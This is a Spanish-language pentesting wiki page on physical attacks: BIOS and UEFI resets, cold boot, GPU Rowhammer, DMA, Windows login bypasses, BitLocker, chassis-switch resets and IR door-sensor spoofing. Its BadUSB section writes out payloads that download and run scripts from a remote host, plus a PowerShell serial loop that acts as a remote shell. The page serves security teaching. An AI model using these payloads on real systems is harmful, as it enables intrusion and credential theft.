# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## Recuperación de contraseña de BIOS y seguridad del sistema

**Resetear el BIOS** puede lograrse de varias maneras. La mayoría de las placas base incluyen una **batería** que, al retirarla durante unos **30 minutos**, restablecerá la configuración del BIOS, incluida la contraseña. Alternativamente, se puede ajustar un **jumper en la placa base** para resetear estos ajustes conectando pines específicos.

Para situaciones en las que los ajustes de hardware no son posibles o prácticos, las **herramientas de software** ofrecen una solución. Ejecutar un sistema desde un **Live CD/USB** con distribuciones como **Kali Linux** proporciona acceso a herramientas como **_killCmos_** y **_CmosPWD_**, que pueden ayudar en la recuperación de la contraseña del BIOS.

En los casos en que se desconoce la contraseña del BIOS, introducirla incorrectamente **tres veces** normalmente producirá un código de error. Este código puede usarse en sitios web como [https://bios-pw.org](https://bios-pw.org) para, potencialmente, recuperar una contraseña válida.

### Seguridad UEFI

Para sistemas modernos que usan **UEFI** en lugar del BIOS tradicional, se puede utilizar la herramienta **chipsec** para analizar y modificar la configuración UEFI, incluida la desactivación de **Secure Boot**. Esto puede hacerse con el siguiente comando:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Análisis de RAM y ataques Cold Boot

La RAM conserva datos brevemente después de cortar la energía, normalmente durante **1 a 2 minutos**. Esta persistencia puede extenderse a **10 minutos** aplicando sustancias frías, como nitrógeno líquido. Durante este período ampliado, se puede crear un **memory dump** usando herramientas como **dd.exe** y **volatility** para su análisis.

---

## GPU Rowhammer contra tablas de páginas

Los ataques modernos de GPU Rowhammer son mucho más útiles cuando apuntan a los **GPU virtual-memory metadata** en lugar de buffers ordinarios. Investigaciones recientes sobre **GDDR6 NVIDIA Ampere GPUs** muestran que un atacante que ejecuta código CUDA sin privilegios puede construir patrones de hammering específicos de GPU, usar **memory massaging** para colocar las estructuras de paginación en filas vulnerables, y luego voltear bits en la **last-level page table** o en un **page directory** intermedio. Una vez que una sola entrada de traducción se corrompe, el atacante puede iniciar **arbitrary GPU memory read/write** y luego pivotar hacia la compromisión del host.

### Patrón de explotación

1. **Profile hammerable rows** en GDDR6 y construir patrones de hammering sensibles al refresh / no uniformes que eludan mitigaciones in-DRAM.
2. **Massage GPU allocations** para que el driver coloque las estructuras de traducción de páginas en ubicaciones físicas vulnerables en lugar de mantenerlas en el pool protegido por defecto. En la práctica, esto puede significar agotar la región de page-table de low-memory y hacer spraying de grandes mapeos UVM dispersos con strides controlados.
3. **Flip translation metadata** como **PFN** o bits relacionados con la aperture dentro de una entrada de page-table / page-directory para que la página virtual controlada por el atacante se resuelva en páginas de page-table, memoria arbitraria de GPU o mapeos de sistema visibles para el host.
4. Reutilizar el mapeo falsificado para reescribir entradas de traducción adicionales y escalar hacia **arbitrary GPU memory read/write** en todos los contextos de GPU.

### Pivot al host y mitigaciones

- Con **IOMMU disabled**, los mapeos de system-aperture falsificados pueden exponer **host physical memory** arbitraria a la GPU, convirtiendo la primitiva de la GPU en una compromisión total del host.
- **GDDRHammer** apunta a entradas de last-level page-table, mientras que **GeForge** muestra que corromper un nivel de page-directory puede ser más fácil porque un solo bit flip puede redirigir un subárbol de traducción más grande. No trates solo una capa de paginación como crítica para la seguridad.
- **IOMMU** sigue siendo importante porque bloquea la ruta directa de arbitrary-host-memory usada por GDDRHammer/GeForge, pero **no es una mitigación completa**. **GPUBreach** muestra un pivot de segunda etapa donde el atacante corrompe buffers CPU-writable, propiedad del driver, y luego activa bugs de memory-safety del driver de NVIDIA para obtener una primitiva de kernel write y un **root shell** incluso con IOMMU enabled.
- **System-level ECC** es una medida práctica de hardening en GPUs de workstation/servidor compatibles. Las GPUs de consumo sin ECC exponen una superficie de defensa más débil.
- Estos ataques no son puramente teóricos: **GeForge** reportó **1,171** bit flips en una RTX 3060 y **202** en una RTX A6000, suficiente para construir una cadena funcional de escalada de privilegios en el host.

---

## Ataques de Direct Memory Access (DMA)

**INCEPTION** es una herramienta diseñada para la **physical memory manipulation** mediante DMA, compatible con interfaces como **FireWire** y **Thunderbolt**. Permite eludir procedimientos de inicio de sesión parcheando la memoria para aceptar cualquier contraseña. Sin embargo, es ineficaz contra sistemas **Windows 10**.

---

## Live CD/USB para acceso al sistema

Cambiar binarios del sistema como **_sethc.exe_** o **_Utilman.exe_** por una copia de **_cmd.exe_** puede proporcionar un command prompt con privilegios de sistema. Herramientas como **chntpw** pueden usarse para editar el archivo **SAM** de una instalación de Windows, permitiendo cambiar contraseñas.

**Kon-Boot** es una herramienta que facilita el inicio de sesión en sistemas Windows sin conocer la contraseña, modificando temporalmente el kernel de Windows o UEFI. Más información en [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Manejo de funciones de seguridad de Windows

### Atajos de arranque y recuperación

- **Supr**: Acceder a la configuración de BIOS.
- **F8**: Entrar en modo Recovery.
- Pulsar **Shift** después del banner de Windows puede eludir autologon.

### Dispositivos BAD USB

Dispositivos como **Rubber Ducky** y **Teensyduino** sirven como plataformas para crear dispositivos **bad USB**, capaces de ejecutar payloads predefinidos cuando se conectan a un equipo objetivo.

### Volume Shadow Copy

Los privilegios de administrador permiten crear copias de archivos sensibles, incluido el archivo **SAM**, mediante PowerShell.

## Técnicas de BadUSB / HID Implant

### Implantos de cable gestionados por Wi-Fi

- Los implantes basados en ESP32-S3 como **Evil Crow Cable Wind** se ocultan dentro de cables USB-A→USB-C o USB-C↔USB-C, se enumeran únicamente como un teclado USB y exponen su stack C2 por Wi-Fi. El operador solo necesita alimentar el cable desde el host víctima, crear un hotspot llamado `Evil Crow Cable Wind` con contraseña `123456789`, y navegar a [http://cable-wind.local/](http://cable-wind.local/) (o a su dirección DHCP) para llegar a la interfaz HTTP integrada.
- La interfaz del navegador proporciona pestañas para *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* y *Config*. Los payloads almacenados se etiquetan por SO, los keyboard layouts se cambian al vuelo y las cadenas VID/PID pueden alterarse para imitar periféricos conocidos.
- Como el C2 vive dentro del cable, un teléfono puede preparar payloads, activar la ejecución y gestionar credenciales Wi-Fi sin tocar el SO del host—ideal para intrusiones físicas de corta permanencia.

### payloads AutoExec conscientes del SO

- Las reglas AutoExec vinculan uno o más payloads para ejecutarse inmediatamente después de la enumeración USB. El implante realiza un fingerprinting ligero del SO y selecciona el script correspondiente.
- Flujo de ejemplo:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) o `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Como la ejecución no requiere supervisión, con solo cambiar un cable de carga se puede lograr acceso inicial “plug-and-pwn” bajo el contexto del usuario que ha iniciado sesión.

### Shell remoto sobre Wi-Fi TCP arrancado desde HID

1. **Keystroke bootstrap:** Un payload almacenado abre una consola y pega un bucle que ejecuta todo lo que llega al nuevo dispositivo serial USB. Una variante mínima para Windows es:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** El implante mantiene abierto el canal USB CDC mientras su ESP32-S3 lanza un cliente TCP (script de Python, APK de Android o ejecutable de escritorio) de vuelta al operador. Cualquier byte escrito en la sesión TCP se reenvía al bucle serie anterior, dando ejecución remota de comandos incluso en hosts air-gapped. La salida es limitada, así que los operadores normalmente ejecutan comandos a ciegas (creación de cuentas, preparación de tooling adicional, etc.).

### HTTP OTA update surface

- El mismo web stack suele exponer actualizaciones de firmware sin autenticación. Evil Crow Cable Wind escucha en `/update` y flashea cualquier binario que se suba:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Los operadores de campo pueden hacer hot-swap de funciones (p. ej., flash USB Army Knife firmware) en mitad de la operación sin abrir el cable, lo que permite que el implant pivote a nuevas capacidades mientras sigue conectado al host objetivo.

## Bypassing BitLocker Encryption

El cifrado BitLocker puede ser potencialmente bypassed si la **recovery password** se encuentra dentro de un archivo de volcado de memoria (**MEMORY.DMP**). Herramientas como **Elcomsoft Forensic Disk Decryptor** o **Passware Kit Forensic** pueden utilizarse para este fin.

---

## Ingeniería social para añadir recovery key

Se puede añadir una nueva BitLocker recovery key mediante tácticas de ingeniería social, convenciendo a un usuario de que ejecute un comando que añade una nueva recovery key compuesta de ceros, simplificando así el proceso de decryption.

---

## Explotación de chassis intrusion / maintenance switches para hacer factory-reset del BIOS

Muchos laptops modernos y desktops de pequeño formato incluyen un **chassis-intrusion switch** supervisado por el Embedded Controller (EC) y el firmware del BIOS/UEFI. Aunque el propósito principal del switch es generar una alerta cuando se abre un dispositivo, a veces los vendors implementan un **undocumented recovery shortcut** que se activa cuando el switch se alterna siguiendo un patrón específico.

### Cómo funciona el ataque

1. El switch está cableado a una **GPIO interrupt** en el EC.
2. El firmware que se ejecuta en el EC mantiene un registro de la **temporización y el número de pulsaciones**.
3. Cuando se reconoce un patrón hard-coded, el EC invoca una rutina *mainboard-reset* que **borra el contenido del system NVRAM/CMOS**.
4. En el siguiente arranque, el BIOS carga los valores por defecto: se eliminan la **supervisor password**, las claves de Secure Boot y toda la configuración personalizada.

> Una vez que Secure Boot está deshabilitado y la firmware password ha desaparecido, el atacante puede simplemente arrancar cualquier imagen de OS externa y obtener acceso sin restricciones a las unidades internas.

### Ejemplo real – Framework 13 Laptop

El recovery shortcut para el Framework 13 (11th/12th/13th-gen) es:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Después del décimo ciclo, el EC establece una bandera que indica al BIOS que borre NVRAM en el siguiente reinicio. Todo el procedimiento tarda ~40 s y no requiere **nada más que un destornillador**.

### Generic Exploitation Procedure

1. Enciende o suspende y reanuda el objetivo para que el EC esté funcionando.
2. Retira la cubierta inferior para exponer el interruptor de intrusión/mantenimiento.
3. Reproduce el patrón de alternancia específico del vendor (consulta documentación, foros o reverse-engineer el firmware del EC).
4. Vuelve a montar y reinicia: las protecciones del firmware deberían quedar deshabilitadas.
5. Arranca un live USB (p. ej., Kali Linux) y realiza el post-exploitation habitual (credential dumping, data exfiltration, implanting malicious EFI binaries, etc.).

### Detection & Mitigation

* Registra eventos de intrusión del chasis en la consola de administración del OS y correlaciónalos con reinicios inesperados del BIOS.
* Emplea **tamper-evident seals** en tornillos/cubiertas para detectar aperturas.
* Mantén los dispositivos en **physically controlled areas**; asume que el acceso físico equivale a compromiso total.
* Cuando esté disponible, deshabilita la función del vendor “maintenance switch reset” o exige una autorización criptográfica adicional para los reinicios de NVRAM.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Los sensores comerciales “wave-to-exit” combinan un emisor LED de near-IR con un módulo receptor estilo mando a distancia de TV que solo informa nivel lógico alto después de haber visto múltiples pulsos (~4–10) del carrier correcto (≈30 kHz).
- Un protector de plástico bloquea que emisor y receptor se vean directamente entre sí, así que el controlador asume que cualquier carrier validado provino de una reflexión cercana y activa un relay que abre el door strike.
- Una vez que el controlador cree que hay un target presente, a menudo cambia la envolvente de modulación de salida, pero el receptor sigue aceptando cualquier ráfaga que coincida con el carrier filtrado.

### Attack Workflow
1. **Captura el perfil de emisión** – conecta un logic analyser a los pines del controlador para registrar tanto las waveforms pre-detection como post-detection que impulsan el LED IR interno.
2. **Reproduce solo la waveform “post-detection”** – retira/ignora el emisor stock y controla un LED IR externo con el patrón ya activado desde el principio. Como el receptor solo se fija en el conteo/frecuencia de pulsos, trata el carrier suplantado como una reflexión legítima y activa la línea del relay.
3. **Gatea la transmisión** – transmite el carrier en ráfagas afinadas (por ejemplo, decenas de milisegundos encendido, apagado similar) para entregar el conteo mínimo de pulsos sin saturar el AGC del receptor ni su lógica de manejo de interferencias. La emisión continua desensibiliza rápidamente el sensor y evita que el relay se active.

### Long-Range Reflective Injection
- Sustituir el LED de banco por un diodo IR de alta potencia, un driver MOSFET y óptica de enfoque permite activar el sistema de forma fiable desde ~6 m de distancia.
- El atacante no necesita línea de visión hacia la apertura del receptor; apuntar el haz a paredes interiores, estanterías o marcos de puertas visibles a través del vidrio permite que la energía reflejada entre en el campo de visión de ~30° y mimetiza un gesto de mano cercano.
- Como los receptores esperan solo reflejos débiles, un haz externo mucho más intenso puede rebotar en múltiples superficies y seguir estando por encima del umbral de detección.

### Weaponised Attack Torch
- Integrar el driver dentro de una linterna comercial oculta la herramienta a plena vista. Sustituye el LED visible por un LED IR de alta potencia ajustado a la banda del receptor, añade un ATtiny412 (o similar) para generar las ráfagas de ≈30 kHz y usa un MOSFET para hundir la corriente del LED.
- Una lente telescópica de zoom estrecha el haz para alcance/precisión, mientras que un motor de vibración controlado por MCU da confirmación háptica de que la modulación está activa sin emitir luz visible.
- Alternar entre varios patrones de modulación almacenados (frecuencias de carrier y envolventes ligeramente distintas) aumenta la compatibilidad entre familias de sensores rebrandeadas, permitiendo al operador barrer superficies reflectantes hasta que el relay haga clic audiblemente y la puerta se libere.

---

## References

- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
